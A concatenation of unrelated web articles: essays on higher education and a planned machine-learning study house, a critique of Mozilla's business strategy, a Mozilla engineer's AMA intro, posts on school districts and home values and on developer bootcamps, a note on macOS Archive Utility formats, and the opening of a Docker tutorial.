<p>How many people have to recognize that higher education is seriously dysfunctional before they should try to coordinate an exit? At what point does a fatalistic attitude vis-a-vis improvements of the education system become a self-fulfilling prophecy?</p>

<p>How many people need to recognize this prisoner's dilemma before they stop defecting?</p>

<p><strong>The Case For Education</strong></p>

<p><em>"Education is the process through which the body of knowledge and culture that we have been accumulating for thousands of years passes from our generation to the next one."</em> -<a href="https://twitter.com/fchollet/status/1278857519784292352">Francois Chollet</a></p>

<p>It's easy to become cynical about higher education.</p>

<p>When I hear praise for the promises and virtues of education I often roll my eyes. Not because I disagree that education has the potential to change the world for the better, but because the institutions that people are defending by making vague idealistic statements about education are doing a terrible job at providing an education that actually has a positive impact.</p>

<p>So let me now make the case <em>for</em> education.</p>

<p>Education is key to civilizational sanity, sensemaking, and survival. Education is key to <a href="https://www.amazon.com/Secret-Our-Success-Evolution-Domesticating/dp/0691178437/">The Secret of our Success</a>.</p>

<p>Education is the <em>scaffolding</em> on which our society, culture and civilization are built and maintained.</p>

<p>For the first two or three decades of people's lives, they are taken on a guided tour of what humanity has learned and achieved. They are taught the laws that govern our universe, how these laws gave rise to life on earth, and ultimately led to the ascent of our species. They are instructed in the history of the ideas that shaped the trajectory of human civilization, the mistakes made along the way, and the principles of rational thought that have allowed the best ideas to win out. They are introduced to the institutions that form the bedrock of society and have allowed the current generation to live in relative prosperity.</p>

<p>And as they learn about the world, and their place in it, they are also shown the construction sites and <a href="https://equilibriabook.com/">inadequacies</a> of our budding collective project so they will be able to contribute to maintaining and improving on what previous generations have built. And so, just as 20,000 years ago, the information needed for the survival and thriving of a hunter-gatherer tribe was transmitted from generation to generation, today the ideas, information and skills necessary for civilizational sanity and the survival of our species continue to be transmitted.</p>

<p>Let me be more specific. There are two areas for which education is needed in the modern world.</p>

<p>The first is economic growth. Education increases human capital and allows people to be more productive. The success of an economy depends on the ability of its participants to create value for others, and it is the acquisition of knowledge and skills, as well as the discovery of new ideas, that allow this.</p>

<p>Thus many economists believe that in order to come out of the slump in productivity growth that has afflicted advanced economies in the past few decades, education is key.</p>

<p>Where these same economists are often <a href="https://thezvi.wordpress.com/2018/04/21/the-case-against-education-foundations/">led astray</a> is in thinking that the solution lies in sending more people to college. The problem being that college has largely turned into a zero-sum competition for credentials, rather than being a place where people learn valuable skills and information that would allow them to succeed in the modern economy. Only a minority of college graduates get to use much of what they learned in college in their professional life.</p>

<p>Critics of this view often appeal to the second area where education is useful—<a href="https://thememeticist.com/education/2020/05/11/education-public-good.html">the public good of an educated citizenry</a>.</p>

<p>This is an important point often overlooked by detractors of the education system.</p>

<p>In theory, a zero-sum competition for credentials can be worth it even if it doesn't lead to the acquisition of skills useful on the labor market if it leads to the positive externality of creating citizens who will productively contribute to resolving problem areas that are left unsolved (or even caused) by free markets. Whether it is by voting, the choice of a career, public service, charitable giving… people have great power to contribute to human flourishing.</p>

<p>And so, an education that is not only job training is crucial for a well-functioning society.</p>

<p>But once again, looking through this lens, the current institutions of higher education perform quite poorly. College grads know little about public affairs, are taught even less about how they might have a positive impact on the world, and even the most prestigious universities—priding themselves on educating the next generation of leaders—seem more set on <a href="https://palladiummag.com/2020/07/27/harvard-creates-managers-instead-of-elites/">creating mid-level managers than an elite that can take on the responsibility of contributing to human progress</a>.</p>

<p>No wonder <a href="https://thememeticist.com/education/2020/05/12/trillion-dollar-bills.html">trillion-dollar bills are regularly left on the sidewalk</a>.</p>

<p>So if education is so important, why do EA orgs like 80k and GiveWell recommend against working to improve it?</p>

<p>Isn't what I have discussed above exactly what EA is all about?</p>

<p>I think the simple answer is that EA and the rationalist community are in fact working to fix education. It's just that there is an implicit understanding in EA and rationalist orgs that the institutions that are conventionally thought to be responsible for providing an education are too broken to be fixed.</p>

<p>After all, you don't get involved in EA or LW by eschewing learning. Quite the contrary. There are few communities that value their education more. One of the most up-voted posts on LessWrong is titled <a href="https://www.lesswrong.com/posts/xg3hXCYQPJkwHyik2/the-best-textbooks-on-every-subject">The Best Textbooks on Every Subject</a>. One of the most up-voted posts on the EA Forum is a <a href="https://forum.effectivealtruism.org/posts/bsE5t6qhGC65fEpzN/growth-and-the-case-against-randomista-development">long post</a> describing the academic literature on the importance of economic growth.</p>

<p>EA orgs don't think that improving education is an important cause because they are the ones providing the education …</p></div></article></div></div></div>

  <div itemprop="articleBody">
    <p><a href="https://thememeticist.com/education/2020/08/14/the-best-educational-institution.html"><em>Important context.</em></a></p>

<p>I am currently planning to rent a large house in northern England, somewhere rents are affordable, for people to study or to research machine learning. ML seems to be an obvious initial choice. I believe that the model of getting a group of smart, somewhat self-motivated people under one roof to work on or study a particular topic, to give them some structure, peer support and accountability, and then to validate progress being made by means of comprehensive standardized exams, is one that could work for any subject.</p>

<p>But since, today already, it is possible to get into ML without traditional qualifications, creating a comprehensive exam isn't really necessary. <a href="https://triplebyte.com/"><em>Triplebyte</em></a>, an American company, has even created something similar already: a background-blind test and interview that places successful candidates directly to the last interview of ML or other programming roles at partnering companies.</p>

<p>All people need is a place to study, work on projects, compete in <a href="https://www.kaggle.com/"><em>Kaggle</em></a> competitions, prepare for interviews or do <a href="https://medium.com/@andreas_madsen/becoming-an-independent-researcher-and-getting-published-in-iclr-with-spotlight-c93ef0b39b8b">independent research</a>. The network effect alone of such a place would probably be incredible. And that would be possible at a significantly lower price than university or bootcamps alike. And for anyone feeling about university and bootcamps as I do, such an environment would also provide a significantly better learning experience.</p>

<p>The key is to attract people who treat their own education as volunteers rather than grudging conscripts, to create the right supportive social environment and productivity norms, and to have an accountability system that would allow everyone to live up to their own ambitions.</p>

<p>The concrete steps that can be taken to create such an environment are subject to iterative experimentation and improvement. A few ideas: having people write down their goals before arriving, regular one-on-one meetings to discuss progress, productivity and difficulties, encouraging work in public spaces, a weekly event to discuss research papers, communal dinners…</p>

<p>But the real innovation here is cultural. The revolutionary potential I see in such a place is not based on some great education technology or new teaching method, but on the expectations of the residents. Expectations of themselves and of others. Expensive and mediocre educational institutions have created the belief among many that learning requires some rigid ritual of lectures, assignments and tests. Those who see past this illusion have the potential to transform our understanding of what an education entails.</p>

<p>If you are interested in coming to such a place, believe that others would benefit from this project getting off the ground, would consider investing, or just believe that such a place should exist, I invite you to add your information <a href="https://docs.google.com/forms/d/e/1FAIpQLSfcb_8PijSmP69-rw1pdr2ZnHEsFK_weApyWzRa9maiF6PCeQ/viewform?usp=sf_link">here</a>, and to share this widely. This becoming a reality will depend on it.</p>

      <p>I love Mozilla, I love its mission, and I love its core product, Firefox. It absolutely sucks as a business though.</p>
      <p>I suspected this for many years, re-realizing it every time <a href="https://news.ycombinator.com/item?id=24120336" target="_blank" rel="noopener">Hacker News</a> or some other story reminded me of its umbilica cord to Google. Relying on one contract to provide over 80% of its revenue<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> every year is bad enough. Forcing itself onto a tightrope walk—privacy as a business model on one side, reliance on your <em>chief competitor</em> (an <em>ad company</em> no less!) to make payroll on the other—is critically negligent.</p>
      <p>Despite Firefox Quantum’s significant improvements over the past three years, I’ve felt for a while that Mozilla has been on a self-inflicted downward spiral and that the number of its eggs in one basket was symptomatic of some yet-unidentified-to-me structural issues. Its <a href="https://blog.mozilla.org/blog/2020/08/11/changing-world-changing-mozilla/" target="_blank" rel="noopener">recent blog post by CEO Mitchell Baker</a> and corresponding <a href="https://blog.mozilla.org/wp-content/uploads/2020/08/Message-to-Employees-Change-in-Difficult-Times.pdf" target="_blank" rel="noopener">internal memo laying off <em>25% of its worforce</em></a> were so resoundingly misguided, though, that <strong>I feared for the first time the organization is all but dead</strong>.</p>
      <p>It’s unclear to me how a message designed to rally the troops and its userbase in a time of crisis could create so much confusion. It appears to be perfectly emblematic, however, of Mozilla’s poor leadership over the last decade, repeated failures at <em>the business side</em> of software development, loss of identity, and inability to innovate while staying <a href="https://www.mozilla.org/en-US/mission/" target="_blank" rel="noopener">true to its mission</a>.</p>
      <p>I use Firefox all day and recommend it. I pay for their limited VPN offering to encourage its development. <strong>I want Mozilla to succeed so badly and deliver on its mission, which is why it’s so painful to feel this way about them.</strong> These are also very hard things to do and as the champion of the “free and open Internet” Mozilla is admittedly held to a very high standard. Its repeated own goals are frustrating and inexcusable, though, and a company of its size and with its brand and trust could succeed with a better direction.</p>
      <h2 id="business">Mozilla is bad at business</h2>
      <p>After over 2 decades as one of the founding Internet companies, Mozilla has shipped essentially one profitable product: Firefox.</p>
      <p>In that time it also <a href="https://en.wikipedia.org/wiki/Usage_share_of_web_browsers" target="_blank" rel="noopener">lost about 80% of Firefox’s browser market share</a><sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> and abandoned its only two other potentially profitable ones, Thunderbird<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> and Firefox OS.</p>
      <p>While it is certainly not required for nonprofits and purpose-driven organizations to sell, they do need to focus on their bottom line if they hope to continue existing. At <a href="https://assets.mozilla.net/annualreport/2018/mozilla-fdn-2018-short-form-final-0926.pdf" target="_blank" rel="noopener">$14MM in 2018</a>, Mozilla’s donations barely scratchd the surface of its $444MM expenses that year.</p>
      <p>Without a fundraising machine, it’s foolish to think Mozilla can continue to develop interesting open source software without any attempts at monetizing it or other endeavors. <strong>It’s also misguided to think that monetizing software means Mozilla has given up on its mission.</strong> Selling software and services is its only path forward and is indeed what it wants to be doing as a mature open source software organization today.</p>
      <p>Unfortunately, instead of realizing this and leveraging its early advantage and market share in a software space <em>where the product is used every day all day by every human being</em>, Mozilla hired consistently bad leaders who set a bad direction, got lazy, and focused on the wrong things.</p>
      <h3 id="slow">Mozilla sat on Firefox’s lead, allowing it to get slow and bloated</h3>
      <p>I was <em>excited</em> to switch away from Firefox in 2009 when Google Chrome became a bit more established. At that point Firefox was much, much better than Internet Explorer 7 and I took advantage of its deep extension ecosystem, but browsing still was slow, the app was very resource intensive, and like all browsers, one tab crashing nuked the whole window. Chrome came out of nowhere and completely reset the expectation on browser speed and footprint. Indeed, it reset the idea of what a good browser even is.</p>
      <ul>
        <li>
          <p><strong>It was very light and fresh</strong>, and its minimalistic interface helped make it <em>feel</em> faster. Tabs moving to the title bar and the removal of anything extra helped the browser get out of the way as much as possible so that I could do what I wanted to do online.</p>
        </li>
        <li>
          <p><strong>The omnibox made search faster.</strong> Combining the dedicated search box and URL bar created huge and unexpected performance gains for me. There was one place to do things—the universal address bar—and I didn’t need to make a decision between URL and search. Firefox did help autocomplete URLs from browsing history, but it still had a dedicated search input. The omnibox removed a big step.</p>
        </li>
        <li>
          <p><strong>Each tab had its own process.</strong> Not only did this prevent the entire browser from crashing when one tab had a problem, it helped speed up browsing even more as there wasn’t one big process for everything.</p>
        </li>
        <li>
          <p><strong>Incognito Mode was very useful.</strong> Safari had apparently had this for years but I wasn’t on a Mac then and Safari wasn’t popular for a lot of other reasons on Windows. While very basic, Incognito windows were my first foray into Internet privacy and became an easy way to load a fresh copy of a website.</p>
        </li>

      <p>Firefox was without question the best browser through the early 2000s and it pushed the web forward in countless ways, often in stark contrast to Microsoft. <a href="https://www.cnet.com/reviews/firefox-3-review/" target="_blank" rel="noopener">Firefox 3 earlier in the year was incredible</a> and set single day download records, but the browser experience was slow and updates felt incremental and not “revolutionary.”</p>
      <p>After Chrome launched, Mozilla started playing catchup and soon began releasing updates to match or mirror its new rival, like moving its tabs up to the title bar and releasing “Private Browsing.” <a href="https://www.technologizer.com/2009/06/30/firefox-3-5-review/2/" target="_blank" rel="noopener">A review of Firefox 3.5</a> captures the beginning of a sentiment that would swell over the next years, emphasis mine:</p>
      <blockquote>
        <p><strong>Today’s most interesting browser isn’t Firefox—it’s Chrome</strong>, with its spare user interface and total focus on making Web apps run seamlessly. The most feature-rich browser continues to be Opera—and with the new Unite server technology, Opera is being daring in a way that Mozilla isn’t.</p>
      </blockquote>
      <p>While Firefox 3.5 was still often recommended as “the most well-rounded browser overall,” users begain saying things like “3.5’s enhancements <em>get Firefox back in the game</em> in several areas where other browsers had jumped ahead.” Speed became the number one factor and Firefox lagged, and as Chrome launched its own extensions the delta began retracting.</p>
      <p>As Mozilla fell behind on speed and footprint, its inability to match Google’s heavy advertising of Chrome sealed its fate. This is perhaps unfair as Google was able to plaster “Download Chrome!” ads on its trillions of pageviews daily, but if Mozilla had stayed hungry and leveraged its position, it could have anticipated the latent demand for a more minimal, faster, and lighter browser. It didn’t and began conceding marketshare with every Chrome release, importantly to many of the IT and tech enthusiasts who recommend and install browsers.</p>
      <p>While I’ve been back and loving Firefox since Quantum came out in 2017 and will not install Google Chrome on any machine my family touches, a lot of damage was done in this time period.</p>
      <h3 id="focus">Somewhere Mozilla lost its focus and has failed to innovate where it matters</h3>
      <p><strong>It cannot be overstated how positive a force Mozilla has been</strong> for open source software and Internet freedom. Their contributions over the past two decades are too numerous to list in full, but to highlight a few: recent technologies like <a href="https://www.rust-lang.org/" target="_blank" rel="noopener">Rust</a>, <a href="https://webassembly.org/" target="_blank" rel="noopener">Web Assembly</a>, and <a href="https://servo.org/" target="_blank" rel="noopener">Servo</a> are really innovative and promising web foundations; its contributions to JavaScript, WebGL, and open codecs like AV1 have been critical; even the MDN web docs are an absolutely wonderful resource.</p>
      <p>Over the past decade, though, a lot of its innovation on core products and services was uninspired at best while some, like Thunderbird, were left to rot. The only <em>relevant</em> innovations I can even think of off the top of my head have been Firefox OS, its promising but failed mobile operating system, and multi-account containers, an actual gamechanger in browsing but really the only homerun there.</p>
      <p>Mozilla bet heavily on Firefox OS and under proper management it could have been <em>the</em> community-driven, open source mobile OS with open standards and APIs and a competing app store. The dream. It <em>still</em> could be a phone I’d be happy to switch to, just as I was eager to at the time, had a proper handset shipped. <a href="https://www.cnet.com/news/why-the-death-of-the-firefox-phone-matters/" target="_blank" rel="noopener">It lasted less than 4 years</a>, due in no small part to <a href="https://medium.com/@bfrancis/the-story-of-firefox-os-cb5bf796e8fb" target="_blank" rel="noopener">their new CEO misunderstanding it</a>, among other issues.</p>
      <p>There have been a lot of distractions during this time as well that have peeled resources away from their foundational product: strange partnerships that send data to third parties (even Google Analytics), social advocacy on issues that have nothing to do with the Internet, and bets on trendy technologies that have gone nowhere.</p>
      <p>Why has Mozilla been investing so heavily into virtual reality? Hubs, a service to launch private virtual rooms together, and Firefox Reality, a VR browser, have gone nowhere and do nothing to “ensure the Internet is a global public resource, open and accessible to all.” Mozilla’s acquisition of Pocket was also strange—its forced Firefox integration as a default super-extension angered much of its core userbase for most likely very, very little in return. It also competes directly with Firefox’s native bookmarks/library, a feature that’s been core to the browser experience since inception and could be held back by this competing service.</p>
      <p>While these trendier areas siphoned resources, Mozilla began playing catchup on its one core product. One look at <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=288704" target="_blank" rel="noopener">some of the longest</a> <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=69687" target="_blank" rel="noopener">and more fundamental outstanding bugs</a> is just a very small revelation into some larger issues as to where the company invests resources and what it focuses on. Chrome may not have even existed had Mozilla been …</p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Hi everybody, happy Friday! I am Aaron Klotz, a Staff Software Engineer on the GeckoView team at Mozilla Corporation.</p>
<p>I have worked at Mozilla since the fall of 2012 and have worked on three different teams across that time: Performance, Platform Integration &amp; Security Hardening, and finally GeckoView.</p>
<p>Given the recent news about layoffs, I thought it might be cathartic to do an AMA to share my experiences at Mozilla and try to set the record straight the best that I can. I would not dare try this in other forums, but since the Tildes community is capable of civil discussion, I'll do it here! I provided some proof a long time ago when I first joined Tildes, and I'd like to think that many people in this community are willing to vouch for me at this point, but if you want more, I can add it.</p>
<p>Obviously I cannot discuss issues that are covered by my NDA (but fortunately most issues are <em>not</em> covered), and some details I might want to avoid out of sensitivity for people who were laid off. AMAA!</p>
<p><strong>EDIT 1:</strong> Also to make clear (if it wasn't obvious): These opinions are mine and mine alone, do not reflect the opinion of any Mozilla entity, etc. etc.</p>
<p><strong>EDIT 2:</strong> I'm logging off for the night, but I'll try to follow up throughout the weekend if I have time. Thanks for all the questions! Hopefully I've cleared up some things for you!</p>

<![CDATA[School District Affects Your Home's Value]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
<p>I remember shopping for my first house with my wife and ignoring the school zones and their ratings.  We were solely concentrating on price, square footage, location and appearance.  </p>



<p>While these are all important considerations to take when buying a house, the quality of the schools should have been a big part of it as well.  We didn’t really realize this until it was a bit too late and we had already made a purchase in a bad school district. </p>



<h2>Why would you even ignore school districts?</h2>



<p>Those of you that are new to real estate may wonder why we would ignore it at all.  The reason is simple, price!  It is not uncommon in my city to see a 20% price difference in identical houses in the same general area <a rel="noreferrer noopener" href="https://www.realtor.com/advice/buy/the-right-school-district-how-much-do-schools-affect-real-estate-prices/" target="_blank">based on the school district</a>.</p>



<p>The school district a house is in can be the difference between the house costing $400,000 and $500,000.  It is easy to say “I am not paying $100,000 extra for the same house in a different school district”.</p>



<p>This seems like the reasonable thing to do but it is a false economy.  Your house will become one of your most valuable <a href="https://www.dollartrak.com/2020/05/22/assets-explained/">assets</a> so you owe it to yourself to do a bit more research.  </p>



<h2>How Much Does That Savings Really Cost Me?</h2>



<p>I never asked myself this question until my oldest child was getting close to school age.  Then I sat down and did the math.</p>



<h4>Private School Tuition</h4>



<p>If you plan on having children then I would suggest calling a few of the local private schools and inquiring about their tuition.  In my case private school tuition was around $15,000 per year for each kid!  To make matters worse tuition was rising at rates over 5% a year.</p>



<p>I did some <a href="https://www.dollartrak.com/time-value-of-money/">time value of money</a> calculations on the tuition costs for my two children and 13 years of K-12 private school education for each.  Not accounting for the inflation of prices, each child was going to cost me $195,000 apiece in tuition.  With 5% growth the actual number was <em>over $265,000 for each child</em> through high school!</p>



<p><em>That $100,000 savings on the purchase price of the house was going to cost me over half a million dollars over 13 years.</em></p>



<p>This money would be far better utilized by <a href="https://www.dollartrak.com/college-529-savings-goal/">investing in a 529 plan</a> and using it to pay for a great college education.</p>



<h4>Education is always in demand</h4>



<p>We decided that the poor schools in my area were a cost we were not willing to bear.  We decided to change houses.  </p>



<p>Of course this comes with the huge expense of selling a house where you can lose up to 10% of your house value in fees, expenses, commissions, and closing costs.  This cost around $40,000 in our case.  </p>



<p>On top of that, we found out the hard way that houses in poor school districts are harder to sell while good school district homes can be somewhat recession proof.  In a cool market it took us longer and cost more discounts to unload our old house than expected.  At the same time we had to get into bidding wars on houses in top school districts.</p>



<h4>You can’t sell a diploma but you can sell a house</h4>



<p>When your kids graduate from high school you can always sell the house to get your money back.  Many people want to downsize by this point in their life anyhow.  Since education will still be in demand, you can always sell the house to recoup the extra money you spent.</p>



<p>As the population in our area grew but the number of quality schools stayed the same there was evidence that appreciation of home values were actually higher in good school district areas.  This is likely very local market oriented so you will need to do your own research here.</p>



<h4>What if I don’t and won’t have kids</h4>



<p>I would still consider it even if you don’t plan on needing schools.  Demand was more stable and appreciation rates higher in my area which made it a good financial decision for me even without the private school tuition savings.  </p>



<p>It has been my experience that when people buy into an area based on the quality of schools, parks, etc, they tend to be very motivated to maintain and improve the community.  This just means a better place to hang your hat.</p>



<h4>What if we want to do private school anyhow</h4>



<p>Many people will want to send their kids to private school regardless of the quality of public schools in their area.  What I found was that quality public schools in the area help control the price of private schools in the area.</p>



<p>In a community with bad public schools, private schools can charge whatever they want and people will pay it.  In a community with good public options, private schools have some limitations over what they can get away with.  </p>



<p>It is probably a good idea to do some basic research and check the tuition rates of some private school options.  For my situation they were significantly cheaper in the area with great public schools.</p>



<h4>What about risks to my investment</h4>



<p>Buying in a great school district is not totally risk free.  The schools could devolve in your district and change from an asset to a liability.  I personally don’t see this as a major risk though, as I mentioned earlier the people that buy there are invested in maintaining the community and schools.  If anything, I think the risk of the community falling apart while you live there is lower.</p>



<p>The other way you can be impacted is if you are re-zoned into a different district.  This can be a real risk if you have areas with poor schools adjacent to areas with good schools.  You can get rezoned into a poor school district.  Research how often the schools in the area redistrict.  Moving very close to the school itself can help reduce the risk you are rezoned.</p>



<h2>Conclusion</h2>



<p>I wish I had known then what I know now.  I could have saved myself a lot of hassle and tens of thousands of dollars.  While it may seem like a steep price to pay to get into a good school district, it is often worth it.  </p>



<p>If you don’t ever end up having kids you should at least break even on the purchase difference.  </p>



<p>If you do have kids it will probably save you hundreds of thousands of dollars over the course of their education as well as give you better and easier sales options when you decide to move on. </p>

<p><em>Since publishing this post in October, 2014 I’ve taught or guest lectured at several of Chicago’s developer training programs including Dev Bootcamp, General Assembly, Fullstack Academy, and (now defunct) Startup Institute. While each of these programs is different, this advice generally still applies to anyone interested in joining one of them as a student.</em></p>
<p><em>As with any educational investment, do your homework first. Talk to grads, teachers, and employers before you make the plunge.</em></p>
<hr>
<p>You’ve probably noticed the rise in&nbsp;<a href="https://www.coursereport.com/cities/san-francisco">short-term developer training programs</a> often called “bootcamps.” Dev Bootcamp, General Assembly, Mobile Makers, and Fullstack Academy are just a few of the programs currently operating in Chicago with the goal of training the next generation of entry level software engineers and developers.</p>
<p>If you have a more traditional computer science background you may be skeptical, but these programs aren’t trying to teach all of computer science in a few weeks. Their training programs are more analogous to trade schools, and often they take applicants from non-traditional backgrounds who are looking to make a career transition. The goal of each program varies, but generally they are trying to teach students enough applied knowledge to build a website or mobile app in 6 to 12 weeks.</p>
<h2 id="why-have-these-programs-taken-off-lately">Why have these programs taken off lately?</h2>
<p>The quick pitch for most dev bootcamps is that there are tons of jobs for web developers out there, and in just a few weeks this program&nbsp;will help you&nbsp;learn the ropes to get hired as a Junior Developer.&nbsp;In addition, there are a few other reasons people get hooked:</p>
<h3 id="1-software-startups-are-sexy">1. Software startups are “sexy”</h3>
<p>The stories of Facebook and Twitter’s rocketship style success aren’t going away anytime soon, and they continue to inspire naive youngsters to chase the dream of founding or joining the next massively successful startup. Having been in a couple of failed startups already, I can tell you that it’s rarely this sexy, but the perception that they are keeps bringing in gobs of&nbsp;new interest.</p>
<h3 id="2-there-is-a-serious-lack-of-technical-talent">2. There is a serious lack of technical talent</h3>
<p>The truth is that there is <em>not</em> a lack of talent when it comes to entry level developers, but the need for experienced software engineers is fueling a flood of interest in the profession. It doesn’t hurt that software engineers are often cited in jobs charts (<a href="http://www.npr.org/blogs/money/2014/10/16/356176018/the-most-popular-jobs-for-the-rich-middle-class-and-poor">like this one</a>) that show them making six-figure incomes, although it should be noted that most early-stage startups <a href="https://www.karllhughes.com/posts/myths-working-engineer-startup">aren’t a good choice if salary is your deciding metric</a>.</p>
<h3 id="3-millennials-without-useful-degrees-or-experience-are-desperate">3. Millennials without useful degrees or experience are desperate</h3>
<p>Ah, my generation is growing up, but they’re still looking for get-successful-quick schemes.</p>
<p>I can’t tell you how many times a friend of mine who studied English or Anthropology or Philosophy in undergrad has told me how jealous they are of my engineering degree and my job which although technical still gives me great freedom to flex my creative muscles. I’m not going to say that all of them didn’t work hard in college, but&nbsp;many of the ones who are still living at home chose their majors based on the amount of work they <em>wouldn’t</em> have to do in class. When an offer for&nbsp;a successful career in software development&nbsp;in just 8 weeks comes across their path, you can see why they might be tempted.</p>
<h3 id="4-frameworksoffer-deceptively-easysolutions">4. Frameworks&nbsp;offer deceptively “easy”&nbsp;solutions</h3>
<p>Finally, I have to put some of the blame on the pitch for frameworks like Ruby on Rails. I’m all for using frameworks to help get a project kicked off quickly, but without a base level of knowledge in the language or any idea what object oriented programming means, people hacking on Rails are just dangerous.</p>
<p><strong>There’s a false security in setting up your first Rails app that makes you feel like you know a lot more than you really do.</strong> No matter why they’ve gotten popular,&nbsp;these “bootcamp” programs seem to be here to stay. I don’t think they’re all bad, and I do think they’re actually a more practical solution than trying to go back to college for many people. But, some of them have been misadvertised. Whether you’re thinking about joining one of these bootcamps or thinking about hiring someone who’s recently graduated from one,&nbsp;you should&nbsp;keep your expectations in line with reality.</p>
<h2 id="so-what-areshort-term-developer-training-programsgood-for">So what are&nbsp;short term developer training programs&nbsp;good for?</h2>
<h3 id="1-introducing-students-to-the-web-developmentindustry">1. Introducing students to the web development&nbsp;industry</h3>
<p>For students with a prior career in corporate America,&nbsp;getting exposed to the goods and bads of&nbsp;working as a software developer is a very good thing. The media&nbsp;does its part to glorify venture-funded software startups way too much, so actually meeting people who work for them, hearing&nbsp;from developers, and learning more about the industry as a whole will hopefully show them a bit of the less glamorous side before they commit full-steam.</p>
<h3 id="2-networking-with-employersandprofessional-contacts">2. Networking with employers&nbsp;and&nbsp;professional contacts</h3>
<p>The startup community in most cities in America is pretty close-knit, so once you&nbsp;get in it’s not hard to network your way around it. Getting your foot in the door in the first place may be a bit tougher, so&nbsp;networking with people should really be the focus of these programs. The amount you can learn about software development in 8 weeks is pretty small, but the number of new people you can meet is significant.</p>
<h3 id="3-a-very-minimal-introduction-to-applied-web-application-development">3. A very minimal introduction to applied web application development</h3>
<p>A few of the students I’ve seen coming out of these bootcamp programs are ready to take on roles as junior-level developers, but usually they had some experience with programming or engineering before the class began. Most are ready for apprenticeship programs where they’ll actually get to work with a mentor and slowly work their way into a full-time gig, and some are not much better off than people who hacked their way through <a href="https://www.codecademy.com/">Codecademy</a>. Either way,&nbsp;no sane person should&nbsp;think that in 3 to 6 months anyone could train&nbsp;a&nbsp;proficient software&nbsp;developer.</p>
<h2 id="what-are-these-programs-not-doing">What are these programs <em>not</em> doing?</h2>
<p>While networking opportunities, and a base level of competency can certainly be established in a few weeks, there are serious limitations to these short term training programs.&nbsp;Here’s what I have&nbsp;not seen all of these programs doing:</p>
<h3 id="1-teaching-students-computer-science">1. Teaching students computer science</h3>
<p>When you’re trying to churn out students who can launch a working Rails app in just a few weeks, it’s impossible to take the time to teach them much of the theory or architecture required to be a high quality software engineer. While you can certainly argue that <a href="https://www.wired.com/2017/02/programming-is-the-new-blue-collar-job/">not every code monkey needs to know&nbsp;how a microprocessor works</a>, there’s a middle-ground somewhere that every software engineer should know.</p>
<h3 id="2-being-completely-transparent-with-how-long-it-takes-to-actually-become-a-good-web-developer">2. Being completely transparent with how long it takes to actually become a good web developer</h3>
<p>I asked one of the students in one of these fast track development programs what he hoped to do after the program. “Well, I want to spend a few months mastering web development and then join a startup as a CTO or something,” he told me quickly. I laughed.</p>
<p>While some of the students I’ve met realize that “mastering” software is a life-long process, <strong>the students who&nbsp;are drawn to these&nbsp;bootcamp methods of learning are inherently more likely to be under the impression that in a few weeks they will actually know something significant.</strong> This assumption needs to be pruned early.</p>
<p>I think some of these programs do a good job keeping their students’ expectations in check and&nbsp;offering them&nbsp;a quality curriculum along with opportunities to network and meet mentors, but I want to be clear in stating that&nbsp;<em>each of these bootcamp-type programs will be different.</em>&nbsp;You should do your research before investing a lot of money in&nbsp;one. If you have your own thoughts, feel free to leave them for me on <a href="https://twitter.com/KarlLHughes">Twitter</a>.</p>

<h4 id="long-version">Long version:</h4>
<p>This morning I was reading <a href="https://dev.to/riknelix/fast-and-efficient-recompression-using-previous-compression-artifacts-47g5">an article about improvements to the Brotli compression algorithm</a>, and found myself wondering: “<em>What compression formats does Apple’s Archive Utility support by default?</em>”. Searching Google didn’t immediately turn up anything (something I’ve been finding more and more recently), so I wondered if there’s a way to inspect the application to find out what it supported.</p>

<p>There was a <a href="https://superuser.com/questions/440657/search-for-files-which-will-open-a-certain-application-in-mac-os-x/440670#440670">Super User answer that pointed me in the right direction</a>, but Archive Utility didn’t have an <code>Info.plist</code> with the file information. What it had instead was a bunch of icons that listed the extension names for supported files. It’s not 100% clear if this list is exhaustive, but it’s good enough for me.</p>

<p><img src="https://anderegg.s3.amazonaws.com/archive-utility.png" alt="Archive Utility's Resources folder"></p>

<p>You can find this folder here:</p>

<p><code>/System/Library/CoreServices/Applications/Archive\ Utility.app/Contents/Resources</code></p>

<p>After finding the list, I fell down a rabbit hole of investigating seldom-used compression formats. I’ve added links above to Wikipedia pages for all the formats I could find. The <code>.bin</code> link is a general one, as I’m not sure exactly which format is supported here. The <code>.aar</code>, <code>.as</code>, and <code>.uu</code> formats were unknown to me, but I’m pretty sure the links are correct for these. The one standout was <code>.yaa</code>, which I’d also never heard of. It appears to be Mac-specific. There’s a man page for it (<code>man yaa</code> in a Terminal window) which provides a bit more detail. <a href="https://www.mackungfu.org/NewcommandlinetoolsinHighSierra">It seems it was added in High Sierra</a>.</p>

<p>I probably shouldn’t find this surprising, but <a href="https://en.wikipedia.org/wiki/StuffIt">StuffIt</a> files (<code>.sit</code>, <code>.sitx</code>) aren’t supported by this utility. StuffIt, though now discontinues, is still a commercial project. But those archives are still so strongly linked with classic Mac OS that it’s hard to see <code>.hqx</code> in the list without immidiately thinking of <code>.sit</code>.</p>

<p>While I’m on the topic, there’s a great <a href="https://en.wikipedia.org/wiki/List_of_archive_formats">list of archive formats</a> on Wikipedia as well. I got immediate waves of nostalgia from seeing <code>.arj</code> and <code>.lha</code> in that list.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>Welcome to Part 2 of my shameless attempt at explaining Docker to beginners. I struggled so you don't have to!</p>
<p>In last week's <a target="_blank" rel="noopener" href="https://blog.antoniolofiego.com/the-hitchhikers-guide-to-the-containers-a-foolproof-hands-on-docker-tutorial-part-1-ckdc4tni0031759s14z0pdd2j">article</a> we covered what Docker is, some of its jargon, and why it outperforms VMs in many use cases in today's typical software development lifecycle. This week we'll go deeper into running Docker on our machines, all while figuring out the most interesting and useful underlying technicalities.</p>
<p><img src="https://media.giphy.com/media/3aGZA6WLI9Jde/giphy.gif" alt="Let's go!"></p>
<h2 id="getting-started-with-docker">Getting started with Docker</h2>
<p>If you don't have Docker installed on your machine, head over to the <a target="_blank" rel="noopener" href="https://docs.docker.com/get-docker/">Docker Download page</a> to get the version that will work on your system.</p>
